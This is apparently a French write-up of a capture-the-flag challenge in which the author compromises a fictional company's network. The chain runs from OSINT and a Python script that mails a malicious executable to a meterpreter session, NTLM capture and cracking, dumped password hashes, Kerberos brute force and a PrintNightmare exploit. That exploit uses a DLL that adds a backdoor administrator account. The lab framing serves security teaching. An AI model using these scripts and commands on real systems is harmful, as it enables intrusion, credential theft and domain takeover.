# Save the Earth
```
La chargée RSE d'une organisation bien connue, Greenbiovitalia, communique beaucoup sur les réseaux sociaux.
Nous craignons que cette mauvaise habitude porte préjudice à la sécurité de cet organisme...
Tentez d'en savoir plus sur la chargée RSE de Greenbiovitalia !
```

Ce challenge est taggué #osint #exploit et propose un accès VPN.

## OSINT


En faisant une simple recherche sur Greenbiovitalia on découvre un compte twitter.

![image](https://github.com/nikaiw/dghack2023/assets/1255732/5972bdd2-7718-408b-ae5f-85f7a0bd7758)


![image](https://github.com/nikaiw/dghack2023/assets/1255732/df3f1217-0fe0-4561-aa05-e822d53236b8)

A première vue, le compte twitter ne semble pas donner beaucoup d'information si ce n'est l'adresse mail avec le nom de domaine de la société.

En se connectant sur le VPN on obtient une route pour les deux /24 suivants:

* 172.10.15.0/24
* 10.10.2.0/24


Le premier est celui sur laquelle on récupère une IP et ou est présent notre gateway **172.10.15.253** qui est declaré aussi comme serveur DNS.
Lors d'une première tentative, probablement à cause d'une surcharge de l'infra, rien ne répond sur la range 10.10.2.0/24.

Cependant, le serveur DNS nous répond bien si on l'interrroge.

```
;; ANSWER SECTION:
dns.greenbiovitalia.ctf. 604800    IN    A    172.10.15.253
```

Disposant du domaine de la société, on se lance dans une énumération DNS.

```
python3 dnsrecon.py -n 172.10.15.253 -D namelist.txt -d greenbiovitalia.ctf
```

## SMTP 

Le seul resultat interessant obtenu est le MX:
```MX smtp.greenbiovitalia.ctf 10.10.2.5```

Après un scan TCP on decouvre que le seul service en écoute est un SMTP dont on confirme le fonctionnement avec netcat

```
Connection to 10.10.2.5 25 port [tcp/smtp] succeeded!
220 webmail.greenbiovitalia.ctf ESMTP Postfix (Debian/GNU)
mail from:myself@greenbiovitalia.ctf
250 2.1.0 Ok
rcpt to:l.tatouille@greenbiovitalia.ctf
250 2.1.5 Ok
DATA 
354 End data with <CR><LF>.<CR><LF>
HELLO THERE


.
250 2.0.0 Ok: queued as AF6B840AD7
```

En réfléchissant à ce qu'il serait possible d'envoyer on remarque que Lara a fait le tweet suivant:

![image](https://github.com/nikaiw/dghack2023/assets/1255732/2f28df55-5736-420b-a5f8-bb60941b7701)

Lara semble disposée à ouvrir nos pièces jointes et j'ai justement quelques propositions RSE qui pourrait lui convenir.

En utilisant le script suivant on envoie un mail à Lara avec le fichier .exe de notre choix qui sera executé.

```python
import smtplib
import sys
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

if len(sys.argv) != 2:
    print("Usage: python send_email.py <file_path>")
    sys.exit(1)

sender_email = "John.doe@greenbiovitalia.ctf"
receiver_email = "l.tatouille@greenbiovitalia.ctf"
subject = "Hello"
message = "Check this out"

smtp_server = "10.10.2.5"
smtp_port = 25

file_path = sys.argv[1]

msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = subject
text = MIMEText(message, 'plain', 'UTF-8')
text.set_param('format', 'flowed')
msg.attach(text)

file_name = os.path.basename(file_path)

with open(file_path, "rb") as file:
    attachment = MIMEBase('application', 'x-ms-dos-executable')
    attachment.set_payload(file.read())
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename="{file_name}"')
    msg.attach(attachment)

try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.set_debuglevel(1)

    server.sendmail(sender_email, receiver_email, msg.as_string())

    print("Debug: Email sent successfully")
except Exception as e:
    print(f"Debug: An error occurred: {str(e)}")
finally:
    if 'server' in locals():
        server.quit()
```

En envoyant un meterpreter on obtient alors un accès sur la workstation de Lara.
On peut commencer à étudier l'environement.

```
meterpreter > getuid
Server username: GREENBIOVITALIA\LaraTatouille
```
```
meterpreter > sysinfo
Computer        : RSE-PC
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : fr_FR
Domain          : GREENBIOVITALIA
Logged On Users : 6
Meterpreter     : x64/windows
```

```
[+] Domain FQDN: greenbiovitalia.ctf
[+] Domain NetBIOS Name: GREENBIOVITALIA
[+] Domain Controller: primary-dc.greenbiovitalia.ctf (IP: 192.168.10.48)
```

```
Répertoire de C:\Users

08/11/2023  11:08    <DIR>          .
08/11/2023  11:08    <DIR>          ..
03/03/2023  23:01    <DIR>          admin
08/11/2023  11:08    <DIR>          LaraTatouille
12/03/2023  18:08    <DIR>          malice
03/03/2023  22:50    <DIR>          Public
```

On consulte alors les documents de Lara sur son bureau et dans mes documents. Le fichier "Don't OPEN .txt" attire inexorablement notre attention.

```
 Répertoire de C:\Users\LaraTatouille\Desktop

19/11/2023  00:39    <DIR>          .
19/11/2023  00:39    <DIR>          ..
19/11/2023  00:38         2�082�816 cse.exe
12/10/2023  11:28                44 Don't OPEN .txt
12/10/2023  11:12            21�188 Elevator Maintenance - An Exercise in Anticipation.pdf
12/10/2023  11:25            67�622 funny-cats-pictures-uu9qufqc5zq8l7el.jpg
12/10/2023  11:09            21�258 Monthly Report on Solar Resource Allocation.pdf
12/10/2023  11:13            21�248 Office Chair Swivel-a-thon.pdf
12/10/2023  11:12            21�130 Reminder - Upcoming Office Potluck Luncheon.pdf
12/10/2023  11:26            34�293 unnamed.jpg
19/11/2023  00:39             7�168 win64https.exe
```

```
File: Don't OPEN .txt
───────────────────────────────────────────
https://www.youtube.com/watch?v=pbkIcQNuv50
```

Merci encore à l'auteur du challenge pour cette découverte musicale.

Après avoir consulté les differents documents de lara il semble a première vue n'y avoir rien d'interessant on continue donc notre exploration de l'environement.

Pour synthétiser la situation depuis la workstation de Lara nous avons:
* une passerelle par defaut en 172.10.10.254.
* une passerelle/firewall en 172.10.10.253 qui route pour 192.168.10.0/24 et pour 10.10.2.0/24

* Sur la range 192.168.10.0/24:
  * Le primary-DC en 192.168.10.48
  * En théorie le secondary-dc en 192.168.10.49 mais qui est down

* Sur la range 10.10.2.0/24:
  * en 10.10.2.5 le serveur smtp/imap/webmail(roundcube)

## Identifiants AD de Lara

Afin d'obtenir le compte AD de Lara, on decide de mettre en écoute un Responder et on declenche un challenge NTLM vers celui-ci depuis le terminal.

```pushd \\notreip\share```

On obtient le challenge/response NTLM suivant:

```
LaraTatouille::GREENBIOVITALIA:16d06c96496791ca:728CC9A8A32B2759E4D38E7E1BBAC10D:01010000000000000062F5B47F1ADA017602122C94FD7AF20000000002000800340036003700430001001E00570049004E002D0039004B0048003200580034005100310048003500410004003400570049004E002D0039004B004800320058003400510031004800350041002E0034003600370043002E004C004F00430041004C000300140034003600370043002E004C004F00430041004C000500140034003600370043002E004C004F00430041004C00070008000062F5B47F1ADA01060004000200000008003000300000000000000000000000002000007D1898DB36A140AF03D36B8AE62BFFA17E725B73003774939F1729E9AD9B56E80A001000000000000000000000000000000000000900200063006900660073002F00360032002E0034002E00310034002E003100310031000000000000000000
```

Après l'avoir donné à hashcat quelque temps on obtient alors le mot de passe "**Password123!**"

## LPE sur la workstation

La machine de Lara Tatouille est un windows 10 disposant des derniers patchs de sécurité de novembre. 
Cependant, il est possible d'utiliser le tool ```https://github.com/ShorSec/DavRelayUp``` afin d'elever nos privileges en relayant une connexion webdav du compte System vers le serveur LDAP de l'AD.

```
admin:1001:aad3b435b51404eeaad3b435b51404ee:5ea2997ef99e720807db90484361b860:::
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
malice:1005:aad3b435b51404eeaad3b435b51404ee:2c52af27061170c8d49acbe781655dd7:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6db5e9bffa4327aa69ea2d1fcbf373ed:::
```

On obtient alors un accès complet à la workstation ce qui nous permet enfin d'atteindre la partie suivante. 

Nan je bluff, en fait la LPE ne sert à rien du tout dans ce challenge, c'est bonus.


## Compromission de l'Active Directory - Part1

Afin de pivoter, on lance un serveur socks avec l'outil de notre choix.

Après avoir:
* Scanné les ports TCP de l'AD
* Scannés les ranges IP accessibles à la recherche d'autres machines
* Obtenu les données de l'annuaire via bloodhound.py
* Tenté d'exploiter Zerologon (CVE-2020-1472)
* Tenté d'exploiter SamAccountName (CVE-2021-42287)
* Analysé la liste des Users, GPO, shares de DC1
* Regardé le script python de Lara qui consulte ses mails ```C:\Users\LaraTatouille\AppData\Roaming\Microsoft\Windows\run-last-mail-attachment-exe.py```
  ![image](https://github.com/nikaiw/dghack2023/assets/1255732/e4d5f049-fa0a-4fc6-b0d5-83cfec59d371)
* Scanné les ports TCP du serveur IMAP
* Vérifié les versions des logiciels sur le serveur mail
* Consulté tous les mails de Lara via roundcube (elle recoit beaucoup de mail ininteressants)

On se dit qu'on a peut-être du passer à coté de quelque chose, on regarde alors à nouveau les documents présents sur la workstation et on réalise que 2 PDF marqués confidentiels dans ses documents donnent en fait des informations plus importantes que juste une chanson à la gloire de Brive-la-Gaillarde, Oh, la, la..🎵


![image](https://github.com/nikaiw/dghack2023/assets/1255732/7e5eded8-e353-440b-a9ba-538419f6ee75)
![image](https://github.com/nikaiw/dghack2023/assets/1255732/4c02a2be-81c2-4234-a355-7f13d63c3007)

Le document nous indique qu'un bruteforce vers DC1 devrait declencher le reveil de DC2. 
Après une tentative de brutefoce infructueuse avec netexec/cme vers SMB, on essaye à nouveau un bruteforce vers le port kerberos cette fois en utilisant https://github.com/ropnop/kerbrute

En moins de 10 essais avec kerbrute, on voit enfin que DC2 sur 192.168.10.49 répond aux pings.

## Compromission de l'Active Directory - Part2 Fin

Commence alors le jeu des 7 différences entre les 2 DCs.

Après avoir:
* scannés les ports TCP
* fait un diff des informations récoltés sur les GPO, Users, computers via bloodhound.py
* Parcouru les shares réseaux

On fini par faire un dump des RPCs accessibles via impacket

![image](https://github.com/nikaiw/dghack2023/assets/1255732/9c0bbee0-c467-4fa0-9ef3-c71a9ba83a88)

On voit tout de suite que DC2 expose des RPCs en plus MS-PAR / MS-PAN correspondant au spooler d'impression. On pense alors tout de suite à print nightmare.

Après avoir obtenu le script d'exploitation https://github.com/cube0x0/CVE-2021-1675 on prepare une dll avec notre payload.

```c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c net user myadmin P@ssword123! /add");
        system("cmd.exe /c net localgroup administrators myadmin /add")
;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```x86_64-w64-mingw32-gcc -shared -o evil.dll test.cpp```

Puis une fois la dll prête, on lance notre attaque en l'exposant sur un share smb 

```proxychains4 -q -f ~/proxy8888.conf python3 CVE-2021-1675.py 'GREENBIOVITALIA/laratatouille:Password123!@SECONDARY-DC' '\\IPDUSHARE\share\evil.dll'```

Pour finir il nous suffit d'utiliser notre compte administrateur nouvellement créé ```python3 secretsdump.py  'greenbiovitalia.ctf/myadmin:P@ssword123!@192.168.10.49'```


Après avoir terminé, ma première déclaration sur le discord du challenge aura été:

"je suis content d'avoir terminé parce que ça tournait vraiment au **cauchemar**." ;)

